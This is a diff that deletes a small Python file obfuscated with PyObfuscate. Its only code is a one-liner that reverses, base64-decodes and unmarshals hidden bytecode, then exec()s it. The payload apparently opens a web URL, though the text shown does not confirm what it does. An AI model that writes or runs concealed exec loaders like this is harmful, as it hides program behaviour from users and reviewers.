@@ -1,5 +1,0 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Wed Nov  8 11:37:17 2023
-# -------------------------------
-_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'AAAAHI3FAA9FAA9FAA9FAA9FAA9FAA9FAA9FAgtPAAtPAQtPAEdPKAdCEKAgJAA2JAYCAmAgJAA2BEQADAPAAAQOzBAAAEAAAAQCy5TZsVHZv1GPIovP4xzA6DAAAAw8AkKAAAgAyhUTCNg2tVGdzl3cGo9cvJg2EkSduVWTI1kQHodApYDMwIjLulWTulmWn5WdB9SbvNmLr92biV2YhZmL3d3dv8iOzBHd0hGIuVGcv1yZkhXM65EAAAAApTQKAMVAkBQADo1AtJAbDQGAkBQAAAAAAAAAAAQArCAABYqAkBAAAAAAAAAABoGAlBgAAoFAsFAZAQGAXCAAAoz8AAAAAAAAAMAAAAAAAAAAAAAAAAwY'))
